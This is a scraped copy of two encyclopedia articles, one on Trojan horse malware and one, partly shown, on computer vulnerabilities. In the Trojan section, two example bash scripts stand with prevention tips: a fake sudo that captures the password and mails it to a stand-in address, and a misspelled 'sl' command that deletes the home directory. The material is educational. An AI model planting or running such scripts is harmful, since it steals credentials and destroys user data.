Zone-H




Malware


Rootkit


Backdoor


Trojan horse


Virus


Worm


Spyware


Ransomware


Logic bomb


Botnet


Keystroke logging


HIDS


Web shell


RCE


Infostealer




Computer security


Application security


Cloud computing security


Network security




Groups


Anonymous


Chaos Computer Club


Homebrew Computer Club
 (defunct)


Legion of Doom
 (defunct)


LulzSec
 (defunct)


Masters of Deception
 (defunct)


Red team
 / 
Blue team




Publications


2600: The Hacker Quarterly


Hacker News


Nuts and Volts


Phrack


v
t
e


In 
computing
, a 
Trojan horse
 (or simply 
Trojan
)   is any 
malware
 that misleads users of its true intent by disguising itself as a standard program. The term is derived from the 
ancient Greek
 story of the deceptive 
Trojan Horse
 that led to the fall of the city of 
Troy
.
[
1
]


Trojans are generally spread by some form of 
social engineering
. For example, where a user is duped into executing an 
email
 attachment disguised to appear innocuous (e.g., a routine form to be filled in), or by clicking on a fake advertisement on social media or anywhere else. Although their payload can be anything, many modern forms act as a 
backdoor
, contacting a controller who can then have unauthorized access to the affected computer.
[
2
]
 
Ransomware
 attacks are often carried out using a Trojan.

Unlike 
computer viruses
 and 
worms
, Trojans generally do not attempt to inject themselves into other files or otherwise propagate themselves.
[
3
]






Use of the term
[
edit
]


It is not clear where or when the concept, and this term for it, was first used, but by 1971 the first 
Unix
 manual assumed its readers knew both:
[
4
]


Another early reference is in a US Air Force report in 1974 on the analysis of vulnerability in the 
Multics
 computer systems.
[
5
]


It was made popular by 
Ken Thompson
 in his 1983 
Turing Award
 acceptance lecture "Reflections on Trusting Trust",
[
6
]
 subtitled: "To what extent should one trust a statement that a program is free of Trojan horses?  Perhaps it is more important to trust the people who wrote the software." He mentioned that he knew about the possible existence of Trojans from a report on the security of Multics.
[
7
]
[
8
]




Behavior
[
edit
]


Once installed, Trojans may perform a range of malicious actions. Many tend to contact one or more 
Command and Control
 (C2) servers across the Internet and await instruction. Since individual Trojans typically use a specific set of ports for this communication, it can be relatively simple to detect them. Moreover, other malware could potentially "take over" the Trojan, using it as a proxy for malicious action.
[
9
]


In German-speaking countries, 
spyware
 used or made by the government is sometimes called 
govware
. Govware is typically a Trojan software used to intercept communications from the target computer. Some countries like Switzerland and Germany have a legal framework governing the use of such software.
[
10
]
[
11
]
 Examples of govware Trojans include the Swiss 
MiniPanzer and MegaPanzer
[
12
]
 and the 
German "state Trojan" nicknamed R2D2
.
[
10
]
 German govware works by exploiting security gaps unknown to the general public and accessing smartphone data before it becomes encrypted via other applications.
[
13
]


Due to the popularity of 
botnets
 among hackers and the availability of advertising services that permit authors to violate their users' privacy, Trojans are becoming more common. According to a survey conducted by 
BitDefender
 from January to June 2009, "Trojan-type malware is on the rise, accounting for 83% of the global malware detected in the world." Trojans have a relationship with worms, as they spread with the help given by worms and travel across the internet with them.
[
14
]
 BitDefender has stated that approximately 15% of computers are members of a botnet, usually recruited by a Trojan infection.
[
15
]


Recent investigations have revealed that the Trojan horse method has been used as an attack on 
cloud computing
 systems. A Trojan attack on cloud systems tries to insert an application or service into the system that can impact the cloud services by changing or stopping the functionalities. When the cloud system identifies the attacks as legitimate, the service or application is performed which can damage and infect the cloud system.
[
16
]




Linux sudo example
[
edit
]


A 
Trojan horse
 is a 
program
 that purports to perform some legitimate function, yet upon execution it compromises the user's security.
[
17
]
 A simple example is the following malicious version of the Linux 
sudo
 command. An attacker would place this script in a publicly writable directory (e.g., 
/tmp
). If an administrator happens to be in this directory and executes 
sudo
, then the Trojan may execute, compromising the administrator's password.



#!/usr/bin/env bash



# Turn off the character echo to the screen. sudo does this to prevent the user's password from appearing on screen when they type it in.

stty
 
-echo


# Prompt user for password and then read input. To disguise the nature of this malicious version, do this 3 times to imitate the behavior of sudo when a user enters the wrong password.


prompt_count
=
1


while
 
[
 
$prompt_count
 
-le
 
3
 
]
;
 
do


    
echo
 
-n
 
"[sudo] password for 
$(
whoami
)
: "


    
read
 
password_input

    
echo


    
sleep
 
3
  
# sudo will pause between repeated prompts


    
prompt_count
=
$((
 
prompt_count
 
+
 
1
 
))


done



# Turn the character echo back on.

stty
 
echo



echo
 
$password_input
 
|
 
mail
 
-s
 
"
$(
whoami
)
's password"
 
outside@creep.com


# Display sudo's actual error message and then delete self.


echo
 
"sudo: 3 incorrect password attempts"

rm
 
$0



exit
 
1
  
# sudo returns 1 with a failed password attempt




To prevent a 
sudo
 
Trojan horse
, set the 
.
 entry in the 
PATH
 environment variable to be located at the tail end.
[
18
]
 For example: 
PATH=/usr/local/bin:/usr/bin:.
.



Linux ls example
[
edit
]


Having 
.
 somewhere in the PATH is convenient, but there is a catch.
[
19
]
 Another example is the following malicious version of the Linux 
ls
 command. However, the filename is not 
ls
; instead, it is 
sl
. An attacker would place this script in a publicly writable directory (e.g., 
/tmp
).



#!/usr/bin/env bash



# Remove the user's home directory, then remove self.

rm
 
-fr
 
~
 
2
>/dev/null
rm
 
$0




To prevent a malicious programmer from anticipating this common typing mistake:



omit 
.
 in the PATH or


alias sl=ls
[
a
]


Notable examples
[
edit
]


Private and governmental
[
edit
]


ANOM
 – FBI


0zapftis / r2d2 StaatsTrojaner
 – DigiTask


DarkComet
 – CIA / NSA


FinFisher
 – Lench IT solutions / Gamma International


DaVinci / Galileo RCS
 – HackingTeam


Magic Lantern
 – FBI


SUNBURST
 – 
SVR
/
Cozy Bear
 (suspected)


TAO QUANTUM/FOXACID
 – NSA


WARRIOR PRIDE
 – GCHQ


Publicly available
[
edit
]


EGABTR
 – late 1980s


Netbus
 – 1998 (published)
[
20
]


Sub7
 by Mobman – 1999 (published)


Back Orifice
 – 1998 (published)


Y3K
 by Tselentis brothers – 2000 (published)


Beast
 – 2002 (published)


Bifrost Trojan
 – 2004 (published)


DarkComet
 – 2008-2012 (published)


Blackhole exploit kit
 – 2012 (published)


Gh0st RAT
 – 2009 (published)


MegaPanzer BundesTrojaner
 – 2009 (published)
[
21
]
[
22
]


MEMZ
 by Leurak – 2016 (published)


Detected by security researchers
[
edit
]


Twelve Tricks
 – 1990


Clickbot.A
 – 2006 (discovered)


Zeus
 – 2007 (discovered)


Flashback Trojan
 – 2011 (discovered)


ZeroAccess
 – 2011 (discovered)


Koobface
 – 2008 (discovered)


Vundo
 – 2009 (discovered)


Coreflood
 – 2010 (discovered)


Tiny Banker Trojan
 – 2012 (discovered)


SOVA – 2022 (discovered)
[
23
]


Shedun
 Android malware – 2015 (discovered)
[
24
]
[
25
]
[
26
]
[
27
]
[
28
]
[
29
]


Capitalization
[
edit
]


The computer term "Trojan horse" is derived from the legendary 
Trojan Horse
 of the ancient city of 
Troy
. For this reason "Trojan" is often capitalized. However, while 
style guides
 and dictionaries differ, many suggest a lower case "trojan" for normal use.
[
30
]
[
31
]




See also
[
edit
]


Computer security


Cuckoo's egg
 (metaphor)


Cyber spying


Dancing pigs


Exploit (computer security)


Industrial espionage


Phishing


Principle of least privilege


Privacy-invasive software


Remote administration


Remote administration software


Reverse connection


Rogue security software


Scammers


Technical support scam


Timeline of computer viruses and worms


Zombie (computer science)


References
[
edit
]






^
 
"Trojan Horse Definition"
. Retrieved 
April 5,
 2012
. 
Greek soldiers, unable to penetrate the defenses of the city of Troy during a years-long war, presented the city with a peace offering of a large wooden horse.




^
 
"Difference between viruses, worms, and trojans"
. 
Symantec Security Center
. Broadcom Inc. 
Archived
 from the original on August 19, 2013
. Retrieved 
March 29,
 2020
.




^
 
"VIRUS-L/comp.virus Frequently Asked Questions (FAQ) v2.00 (Question B3: What is a Trojan Horse?)"
. October 9, 1995. Archived from 
the original
 on August 5, 2020
. Retrieved 
September 16,
 2019
.




^
 
Thompson, Ken; Ritchie, Dennis M. 
"Unix Programmer's Manual, November 3, 1971"
 
(PDF)
. p. 5
. Retrieved 
March 28,
 2020
. 
Also, one may not change the owner of a file with the set—user—ID bit on, otherwise one could create Trojan Horses able to misuse other's files.




^
 
Karger, P.A.; Schell, R.R., 
"Multics Security Evaluation: Vulnerability Analysis , ESD-TR-74-193"
 
(PDF)
, 
HQ Electronic Systems Division: Hanscom AFB, MA
, 
II
, archived from 
the original
 
(PDF)
 on July 9, 2011
, retrieved 
December 24,
 2017




^
 
Ken Thompson (1984). 
"Reflection on Trusting Trust"
. 
Commun. ACM
. 
27
 (8): 761–763. 
doi
:
10.1145/358198.358210
.
.




^
 
Paul A. Karger; Roger R. Schell (2002), 
"Thirty Years Later: Lessons from the Multics Security Evaluation"
 
(PDF)
, 
ACSAC
: 119–126




^
 
Karger et Schell wrote that Thompson added this reference in a later version of his Turing conference: 
Ken Thompson (November 1989), "On Trusting Trust.", 
Unix Review
, 
7
 (11): 70–74




^
 
Crapanzano, Jamie (2003). 
Deconstructing SubSeven, the Trojan Horse of Choice
 (Report). 
SANS Institute
. Retrieved 
May 10,
 2021
.




^ 
a
 
b
 
Basil Cupa, 
Trojan Horse Resurrected: On the Legality of the Use of Government Spyware (Govware)
, LISS 2013, pp. 419–428




^
 
"Häufig gestellte Fragen (Frequently Asked Questions)"
. Federal Department of Justice and Police. Archived from 
the original
 on May 6, 2013.




^
 
Dunn, John (August 27, 2009). 
"Swiss coder publicises government spy Trojan"
. 
TechWorld
. Archived from 
the original
 on January 26, 2014
. Retrieved 
January 10,
 2021
.




^
 
"German federal police use trojan virus to evade phone encryption"
. 
DW
. Retrieved 
April 14,
 2018
.




^
 
"BitDefender Malware and Spam Survey finds E-Threats Adapting to Online Behavioral Trends"
. 
BitDefender
. Archived from 
the original
 on August 8, 2009
. Retrieved 
March 27,
 2020
.




^
 
Datta, Ganesh (August 7, 2014). 
"What are Trojans?"
. 
SecurAid
. Archived from 
the original
 on August 12, 2014
. Retrieved 
March 27,
 2020
.




^
 
Kanaker, Hasan; Karim, Nader Abdel; Awwad, Samer A. B.; Ismail, Nurul H. A.; Zraqou, Jamal; Ali, Abdulla M. F. Al (December 20, 2022). 
"Trojan Horse Infection Detection in Cloud Based Environment Using Machine Learning"
. 
International Journal of Interactive Mobile Technologies
. 
16
 (24): 81–106. 
doi
:
10.3991/ijim.v16i24.35763
. 
ISSN
 
1865-7923
.




^
 
Wood, Patrick H.; Kochan, Stephen G. (1985). 
UNIX System Security
. Hayden Books. p. 42. 
ISBN
 
0-8104-6267-2
.




^
 
Wood, Patrick H.; Kochan, Stephen G. (1985). 
UNIX System Security
. Hayden Books. p. 43. 
ISBN
 
0-8104-6267-2
. 
The above Trojan horse works only if a user's PATH is set to search the current directory for commands before searching the system's directories.




^
 
"What's wrong with having '.' in your $PATH?"
. Penn Engineering
. Retrieved 
November 28,
 2023
. 
[I]f you're a clumsy typist and some day type "sl -l" instead of "ls -l", you run the risk of running "./sl", if there is one. Some "clever" programmer could anticipate common typing mistakes and leave programs by those names scattered throughout public directories. Beware.




^
 
Seth, Kulakow (1998). 
"Is it still a Trojan horse or an Actual Valid Remote Control Administration Tool?"
 (Report). 
SANS Institute
. Retrieved 
May 10,
 2021
.




^
 
"Mega-Panzer"
. 
SourceForge
. September 21, 2016.




^
 
"Mini-Panzer"
. 
SourceForge
. September 18, 2016.




^
 
"What is Sova virus?"
. 
India Today
. September 16, 2022.




^
 
"Trojanized adware family abuses accessibility service to install whatever apps it wants – Lookout Blog"
.




^
 
Neal, Dave (November 20, 2015). 
"Shedun trojan adware is hitting the Android Accessibility Service"
. 
The Inquirer
. Incisive Business Media. Archived from the original on November 22, 2015
. Retrieved 
March 27,
 2020
.
{{
cite web
}}
:  CS1 maint: unfit URL (
link
)




^
 
"Lookout discovers new trojanized adware; 20K popular apps caught in the crossfire – Lookout Blog"
.




^
 
"Shuanet, ShiftyBug and Shedun malware could auto-root your Android"
. November 5, 2015.




^
 
Times, Tech (November 9, 2015). 
"New Family of Android Malware Virtually Impossible To Remove: Say Hello To Shedun, Shuanet And ShiftyBug"
.




^
 
"Android adware can install itself even when users explicitly reject it"
. November 19, 2015.




^
 
"trojan"
. 
Collins Advanced Dictionary
. Retrieved 
March 29,
 2020
.




^
 
"trojan horse"
. 
Microsoft Style Guide
. Microsoft
. Retrieved 
March 29,
 2020
.






Notes
[
edit
]






^
 
Place the 
alias
 statement in 
/etc/profile






External links
[
edit
]


 Media related to 
Trojan horse (malware)
 at Wikimedia Commons


"CERT Advisory CA-1999-02 Trojan Horses"
 
(PDF)
. 
Carnegie Mellon University Software Engineering Institute
. 
Archived
 from the original on October 17, 2000
. Retrieved 
September 15,
 2019
.


v
t
e
Malware
 topics
Infectious malware


Comparison of computer viruses


Computer virus


Computer worm


List of computer worms


Timeline of computer viruses and worms


Concealment


Backdoor


Clickjacking


Man-in-the-browser


Man-in-the-middle


Rootkit


Trojan horse


Zombie computer


Malware for profit


Adware


Botnet


Crimeware


Fleeceware


Form grabbing


Fraudulent dialer


Infostealer


Keystroke logging


Malbot


Privacy-invasive software


Ransomware


Rogue security software


Scareware


Spyware


Web threats


By operating system


Android malware


Classic Mac OS viruses


iOS malware


Linux malware


MacOS malware


Macro virus


Mobile malware


Palm OS viruses


HyperCard viruses


Protection


Anti-keylogger


Antivirus software


Browser security


Data loss prevention software


Defensive computing


Firewall


Internet security


Intrusion detection system


Mobile security


Network security


Countermeasures


Computer and network surveillance


Honeypot


Operation: Bot Roast




v
t
e
Information security
Related security categories


Computer security


Automotive security


Cybercrime


Cybersex trafficking


Computer fraud


Cybergeddon


Cyberterrorism


Cyberwarfare


Electromagnetic warfare


Information warfare


Internet security


Mobile security


Network security


Copy protection


Digital rights management


vectorial version
Threats


Adware


Advanced persistent threat


Arbitrary code execution


Backdoors


Bombs

Fork


Logic


Time


Zip


Hardware backdoors


Code injection


Crimeware


Cross-site scripting


Cross-site leaks


DOM clobbering


History sniffing


Cryptojacking


Botnets


Data breach


Drive-by download


Browser Helper Objects


Viruses


Data scraping


Denial-of-service attack


Eavesdropping


Email fraud


Email spoofing


Exploits


Fraudulent dialers


Hacktivism


Infostealer


Insecure direct object reference


Keystroke loggers


Malware


Payload


Phishing


Voice


Polymorphic engine


Privilege escalation


Ransomware


Rootkits


Scareware


Shellcode


Spamming


Social engineering


Spyware


Software bugs


Trojan horses


Hardware Trojans


Remote access trojans


Vulnerability


Web shells


Wiper


Worms


SQL injection


Rogue security software


Zombie


Defenses


Application security


Secure coding


Secure by default


Secure by design


Misuse case


Computer access control


Authentication


Multi-factor authentication


Authorization


Computer security software


Antivirus software


Security-focused operating system


Data-centric security


Obfuscation (software)


Data masking


Encryption


Firewall


Intrusion detection system


Host-based intrusion detection system
 (HIDS)


Anomaly detection


Information security management


Information risk management


Security information and event management
 (SIEM)


Runtime application self-protection


Site isolation




v
t
e
Software distribution
Licenses


Beerware


Floating licensing


Free and open-source


Free


Open source


Freely redistributable


License-free


Proprietary


Public domain


Source-available


Compensation models


Adware


Commercial software


Retail software


Crippleware


Crowdfunding


Freemium


Freeware


Pay what you want


Careware


Donationware


Open-core model


Postcardware


Shareware


Nagware


Trialware


Delivery methods


Digital distribution


File sharing


On-premises


Pre-installed


Product bundling


Retail software


Sneakernet


Software as a service


Deceptive and/or illicit


Unwanted software bundling


Malware


Infostealer


Ransomware


Spyware


Trojan horse


Worm


Scareware


Shovelware


Software release life cycle


Abandonware


End-of-life


Long-term support


Software maintenance


Software maintainer


Software publisher


Vaporware


list


Copy protection


Digital rights management


Software protection dongle


License manager


Product activation


Product key


Software copyright


Software license server


Software patent


Torrent poisoning


Authority control databases
: National 
Germany










Retrieved from "
https://en.wikipedia.org/w/index.php?title=Trojan_horse_(computing)&oldid=1244648473
"


Categories
: 
Trojan horses
Social engineering (security)
Spyware
Cyberwarfare
Security breaches
Hidden categories: 
CS1 maint: unfit URL
Articles with short description
Short description is different from Wikidata
Use mdy dates from May 2018
Commons category link is on Wikidata











From Wikipedia, the free encyclopedia




(Redirected from 
Vulnerability (computing)
)


Exploitable weakness in a computer system


Part of a series on
Computer hacking


History


Phreaking


Cryptovirology


Hacking of consumer electronics


List of hackers




Hacker culture
 and 
ethic


Hackathon


Hacker Manifesto


Hackerspace


Hacktivism


Maker culture


Types of 
hackers


Black hat


Grey hat


White hat




Conferences


Black Hat Briefings


Chaos Communication Congress


DEF CON


Hackers on Planet Earth


Security BSides


ShmooCon


Summercon




Computer crime


Crimeware


List of computer criminals


Script kiddie




Hacking tools


Exploit


forensics-focused operating systems


Payload


Social engineering


Vulnerability




Practice sites


HackThisSite


Zone-H




Malware


Rootkit


Backdoor


Trojan horse


Virus


Worm


Spyware


Ransomware


Logic bomb


Botnet


Keystroke logging


HIDS


Web shell


RCE


Infostealer




Computer security


Application security


Cloud computing security


Network security




Groups


Anonymous


Chaos Computer Club


Homebrew Computer Club
 (defunct)


Legion of Doom
 (defunct)


LulzSec
 (defunct)


Masters of Deception
 (defunct)


Red team
 / 
Blue team




Publications


2600: The Hacker Quarterly


Hacker News


Nuts and Volts


Phrack


v
t
e


Vulnerabilities
 are flaws in a computer system that weaken the overall security of the system. 

Despite intentions to achieve complete correctness, virtually all hardware and software contains bugs where the system does not behave as expected. If the bug could enable an attacker to compromise the confidentiality, integrity, or availability of system resources, it is called a vulnerability. Insecure 
software development
 practices as well as design factors such as complexity can increase the burden of vulnerabilities. There are different types most common in different components such as hardware, operating systems, and applications. 

Vulnerability management
 is a process that includes identifying systems and prioritizing which are most important, scanning for vulnerabilities, and taking action to secure the system. Vulnerability management typically is a combination of remediation (fixing the vulnerability), mitigation (increasing the difficulty or reducing the danger of exploits), and accepting risks that are not economical or practical to eliminate. Vulnerabilities can be scored for risk according to the 
Common Vulnerability Scoring System
 or other systems, and added to vulnerability databases. As of 2023
[update]
, there are more than 20 million vulnerabilities catalogued in the 
Common Vulnerabilities and Exposures
 (CVE) database.

A vulnerability is initiated when it is introduced into hardware or software. It becomes active and exploitable when the software or hardware containing the vulnerability is running. The vulnerability may be discovered by the vendor or a third party. Disclosing the vulnerability (as a 
patch
 or otherwise) is associated with an increased risk of compromise because attackers often move faster than patches are rolled out. Regardless of whether a patch is ever released to remediate the vulnerability, its lifecycle will eventually end when the system, or older versions of it, fall out of use.





Causes
[
edit
]


Despite developers' goal of delivering a product that works entirely as intended, virtually all 
software
 and 
hardware
 contains bugs.
[
1
]
 If a bug creates a security risk, it is called a vulnerability.
[
2
]
[
3
]
[
4
]
 
Software patches
 are often released to fix identified vulnerabilities, but those that remain unknown (
zero days
) as well as those that have not been patched are still liable for exploitation.
[
5
]
 Vulnerabilities vary in their ability to be 
exploited
 by malicious actors,
[
2
]
 and the actual risk is dependent on the nature of the vulnerability as well as the value of the surrounding system.
[
6
]
  Although some vulnerabilities can only be used for 
denial of service
 attacks, more dangerous ones allow the attacker to 
inject
 and run their own code (called 
malware
), without the user being aware of it.
[
2
]
 Only a minority of vulnerabilities allow for 
privilege escalation
, which is necessary for more severe attacks.
[
7
]
 Without a vulnerability, the exploit cannot gain access.
[
8
]
 It is also possible for 
malware
 to be installed directly, without an exploit, if the attacker uses 
social engineering
 or implants the malware in legitimate software that is downloaded deliberately.
[
9
]




Design factors
[
edit
]


Fundamental design factors that can increase the burden of vulnerabilities include:



Complexity: Large, complex systems increase the probability of flaws and unintended 
access points
.
[
10
]


Familiarity:  Using common, well-known code, software, operating systems, and/or hardware increases the probability an attacker has or can find the knowledge and tools to exploit the flaw.
[
11
]


Connectivity: any system connected to the internet can be accessed and compromised. 
Disconnecting systems from the internet
 is one truly effective measure against attacks, but it is rarely feasible.
[
12
]


Legacy software
 and 
hardware
 is at increased risk, but upgrading often is prohibitive in terms of cost and 
downtime
.
[
13
]


Development factors
[
edit
]


Some 
software development
 practices can affect the risk of vulnerabilities being introduced to a code base.  Lack of knowledge about secure software development or excessive pressure to deliver features quickly can lead to avoidable vulnerabilities to enter production code, especially if security is not prioritized by the 
company culture
. This can lead to unintended vulnerabilities. The more complex the system is, the easier it is for vulnerabilities to go undetected. Some vulnerabilities are deliberately planted, which could be for any reason from a disgruntled employee selling access to hackers, to sophisticated state-sponsored schemes to introduce vulnerabilities to software.
[
14
]
 Inadequate 
code reviews
 can lead to missed bugs, but there are also 
static code analysis
 tools that can be used as part of code reviews and may find some vulnerabilities.
[
15
]


DevOps
, a development workflow that emphasizes automated testing and deployment to speed up the deployment of new features, often requires that many developers be granted access to change configurations, which can lead to deliberate or inadvertent inclusion of vulnerabilities.
[
16
]
 Compartmentalizing dependencies, which is often part of DevOps workflows, can reduce the 
attack surface
 by paring down dependencies to only what is necessary.
[
17
]
 If 
software as a service
 is used, rather than the organization's own hardware and software, the organization is dependent on the cloud services provider to prevent vulnerabilities.
[
18
]




National Vulnerability Database classification
[
edit
]


The 
National Vulnerability Database
 classifies vulnerabilities into eight root causes that may be overlapping, including:
[
19
]




Input validation
 (including 
buffer overflow
 and 
boundary condition
) vulnerabilities occur when 
input checking
 is not sufficient to prevent the attacker from injecting malicious code.
[
20
]


Access control
 vulnerabilities enable an attacker to access a system that is supposed to be restricted to them, or engage in 
privilege escalation
.
[
20
]


When the system fails to handle and exceptional or unanticipated condition correctly, an attacker can exploit the situation to gain access.
[
21
]


A 
configuration  vulnerability
 comes into existence when configuration settings cause risks to the system security, leading to such faults as unpatched software or file system permissions that do not sufficiently restrict access.
[
21
]


A 
race condition
—when timing or other external factors change the outcome and lead to inconsistent or unpredictable results—can cause a vulnerability.
[
21
]


Vulnerabilities by component
[
edit
]


Hardware
[
edit
]


Main article: 
Hardware security bug


Deliberate security bugs can be introduced during or after manufacturing and cause the 
integrated circuit
 not to behave as expected under certain specific circumstances. Testing for security bugs in hardware is quite difficult due to limited time and the complexity of twenty-first century chips,
[
22
]
 while the globalization of design and manufacturing has increased the opportunity for these bugs to be introduced by malicious actors.
[
23
]




Operating system
[
edit
]


See also: 
Operating system § Security


Although 
operating system vulnerabilities
 vary depending on the 
operating system
 in use, a common problem is 
privilege escalation
 bugs that enable the attacker to gain more access than they should be allowed. 
Open-source
 operating systems such as 
Linux
 and 
Android
 have a freely accessible 
source code
 and allow anyone to contribute, which could enable the introduction of vulnerabilities. However, the same vulnerabilities also occur in proprietary operating systems such as 
Microsoft Windows
 and 
Apple operating systems
.
[
24
]
 All reputable vendors of operating systems provide patches regularly.
[
25
]




Client–server applications
[
edit
]


Client–server applications
 are downloaded onto the end user's computers and are typically updated less frequently than web applications. Unlike web applications, they interact directly with a user's 
operating system
. Common vulnerabilities in these applications include:
[
26
]




Unencrypted data that is in permanent storage or sent over a network is relatively easy for attackers to steal.
[
26
]


Process hijacking
 occurs when an attacker takes over an existing 
computer process
.
[
26
]


Web applications
[
edit
]


Web applications
 run on many websites. Because they are inherently less secure than other applications, they are a leading source of 
data breaches
 and other security incidents.
[
27
]
[
28
]
 Common types of vulnerabilities found in these applications include:



Authentication
 and 
authorization
 failures enable attackers to access data that should be restricted to trusted users.
[
27
]


Cross-site scripting
 (XSS) enables attackers to 
inject
 and run 
JavaScript
-based 
malware
 when 
input checking
 is insufficient to reject the injected code.
[
27
]
 XSS can be persistent, when attackers save the malware in a data field and run it when the data is loaded; it can also be loaded using a malicious 
URL
 link (reflected XSS).
[
27
]
 Attackers can also insert malicious code into the 
domain object model
.
[
29
]


SQL injection
 and similar attacks manipulate 
database queries
 to gain unauthorized access to data.
[
29
]


Command injection
 is a form of code injection where the attacker places the malware in data fields or 
processes
. The attacker might be able to take over the entire server.
[
29
]


Cross-site request forgery
 (CSRF) is creating client requests that do malicious actions, such as an attacker changing a user's credentials.
[
29
]


Server-side request forgery
 is similar to CSRF, but the request is forged from the server side and often exploits the enhanced privilege of the server.
[
29
]


Business logic vulnerability
 occurs when programmers do not consider unexpected cases arising in 
business logic
.
[
30
]


Management
[
edit
]


Main article: 
Vulnerability management


There is little evidence about the effectiveness and cost-effectiveness of different cyberattack prevention measures.
[
31
]
 Although estimating the risk of an attack is not straightforward, the mean time to breach and expected cost can be considered to determine the priority for remediating or mitigating an identified vulnerability and whether it is cost effective to do so.
[
32
]
 Although attention to security can reduce the risk of attack, achieving perfect security for a complex system is impossible, and many security measures have unacceptable cost or usability downsides.
[
33
]
 For example, reducing the complexity and functionality of the system is effective at reducing the 
attack surface
.
[
34
]


Successful vulnerability management usually involves a combination of remediation (closing a vulnerability), mitigation (increasing the difficulty, and reducing the consequences, of exploits), and accepting some residual risk. Often a 
defense in depth
 strategy is used for multiple barriers to attack.
[
35
]
 Some organizations scan for only the highest-risk vulnerabilities as this enables prioritization in the context of lacking the resources to fix every vulnerability.
[
36
]
  Increasing expenses is likely to have 
diminishing returns
.
[
32
]




Remediation
[
edit
]


Remediation fixes vulnerabilities, for example by downloading a 
software patch
.
[
37
]
 
Software vulnerability scanners
 are typically unable to detect zero-day vulnerabilities, but are more effective at finding known vulnerabilities based on a database. These systems can find some known vulnerabilities and advise fixes, such as a patch.
[
38
]
[
39
]
 However, they have limitations including 
false positives
.
[
37
]


Vulnerabilities can only be exploited when they are active-the software in which they are embedded is actively running on the system.
[
40
]
 Before the code containing the vulnerability is configured to run on the system, it is considered a carrier.
[
41
]
 Dormant vulnerabilities can run, but are not currently running. Software containing dormant and carrier vulnerabilities can sometimes be uninstalled or disabled, removing the risk.
[
42
]
 Active vulnerabilities, if distinguished from the other types, can be prioritized for patching.
[
40
]




Mitigation
[
edit
]


Vulnerability mitigation is measures that do not close the vulnerability, but make it more difficult to exploit or reduce the consequences of an attack.
[
43
]
 Reducing the 
attack surface
, particularly for parts of the system with 
root
 (administrator) access, and closing off opportunities for exploits to engage in 
privilege exploitation
 is a common strategy for reducing the harm that a cyberattack can cause.
[
37
]
 If a patch for third-party software is unavailable, it may be possible to temporarily disable the software.
[
44
]




Testing
[
edit
]


A 
penetration test
 attempts to enter the system via an exploit to see if the system is insecure.
[
45
]
 If a penetration test fails, it does not necessarily mean that the system is secure.
[
46
]
 Some penetration tests can be conducted with automated software that tests against existing exploits for known vulnerabilities.
[
47
]
  Other penetration tests are conducted by trained hackers. Many companies prefer to contract out this work as it simulates an outsider attack.
[
46
]




Vulnerability lifecycle
[
edit
]


Vulnerability timeline


The vulnerability lifecycle begins when vulnerabilities are introduced into hardware or software.
[
48
]
 Detection of vulnerabilities can be by the software vendor, or by a third party. In the latter case, it is considered most ethical to immediately disclose the vulnerability to the vendor so it can be fixed.
[
49
]
 Government or intelligence agencies buy vulnerabilities that have not been publicly disclosed and may use them in an attack, stockpile them, or notify the vendor.
[
50
]
 As of 2013, the 
Five Eyes
 (United States, United Kingdom, Canada, Australia, and New Zealand) captured the plurality of the market and other significant purchasers included Russia, India, Brazil,  Malaysia, Singapore, North Korea, and Iran.
[
51
]
 Organized criminal groups also buy vulnerabilities, although they typically prefer 
exploit kits
.
[
52
]


Even vulnerabilities that are publicly known or patched are often exploitable for an extended period.
[
53
]
[
54
]
 Security patches can take months to develop,
[
55
]
 or may never be developed.
[
54
]
 A patch can have negative effects on the functionality of software
[
54
]
 and users may need to 
test
 the patch to confirm functionality and compatibility.
[
56
]
 Larger organizations may fail to identify and patch all dependencies, while smaller enterprises and personal users may not install patches.
[
54
]
 Research suggests that risk of cyberattack increases if the vulnerability is made publicly known or a patch is released.
[
57
]
 Cybercriminals can 
reverse engineer
 the patch to find the underlying vulnerability and develop exploits,
[
58
]
 often faster than users install the patch.
[
57
]


Vulnerabilities become deprecated when the software or vulnerable versions fall out of use.
[
49
]
 This can take an extended period of time; in particular, industrial software may not be feasible to replace even if the manufacturer stops supporting it.
[
59
]




Assessment, disclosure, and inventory
[
edit
]


Assessment
[
edit
]


A commonly used scale for assessing the severity of vulnerabilities is the open-source specification 
Common Vulnerability Scoring System
 (CVSS). CVSS evaluates the possibility to exploit the vulnerability and compromise data confidentiality, availability, and integrity. It also considers how the vulnerability could be used and how complex an exploit would need to be. The amount of access needed for exploitation and whether it could take place without user interaction are also factored in to the overall score.
[
60
]
[
61
]




Disclosure
[
edit
]


Someone who discovers a vulnerability may disclose it immediately (
full disclosure
) or wait until a patch has been developed (
responsible disclosure
, or coordinated disclosure). The former approach is praised for its transparency, but the drawback is that the risk of attack is likely to be increased after disclosure with no patch available.
[
62
]
 Some vendors pay 
bug bounties
 to those who report vulnerabilities to them.
[
63
]
[
64
]
 Not all companies respond positively to disclosures, as they can cause legal liability and operational overhead.
[
65
]
  There is no law requiring disclosure of vulnerabilities.
[
66
]
 If a vulnerability is discovered by a third party that does not disclose to the vendor or the public, it is called a 
zero-day vulnerability
, often considered the most dangerous type because fewer defenses exist.
[
67
]




Vulnerability inventory
[
edit
]


The most commonly used vulnerability dataset is 
Common Vulnerabilities and Exposures
 (CVE), maintained by 
Mitre Corporation
.
[
68
]
 As of 2023
[update]
, it has over 20 million entries.
[
38
]
  This information is shared into other databases, including the United States' 
National Vulnerability Database
,
[
68
]
 where each vulnerability is given a risk score using 
Common Vulnerability Scoring System
 (CVSS), 
Common Platform Enumeration
 (CPE) scheme, and 
Common Weakness Enumeration
.
[
citation needed
]
 CVE and other databases typically do not track vulnerabilities in 
software as a service
 products.
[
38
]
 Submitting a CVE is voluntary for companies that discovered a vulnerability.
[
66
]




Liability
[
edit
]


The software vendor is usually not legally liable for the cost if a vulnerability is used in an attack, which creates an incentive to make cheaper but less secure software.
[
69
]
 Some companies are covered by laws, such as 
PCI
, 
HIPAA
, and 
Sarbanes-Oxley
, that place legal requirements on vulnerability management.
[
70
]




References
[
edit
]






^
 
Ablon & Bogart 2017
, p. 1.




^ 
a
 
b
 
c
 
Ablon & Bogart 2017
, p. 2.




^
 
Daswani & Elbayadi 2021
, p. 25.




^
 
Seaman 2020
, pp. 47–48.




^
 
Daswani & Elbayadi 2021
, pp. 26–27.




^
 
Haber & Hibbert 2018
, pp. 5–6.




^
 
Haber & Hibbert 2018
, p. 6.




^
 
Haber & Hibbert 2018
, p. 10.




^
 
Haber & Hibbert 2018
, pp. 13–14.




^
 
Kakareka, Almantas (2009). "23". In Vacca, John (ed.). 
Computer and Information Security Handbook
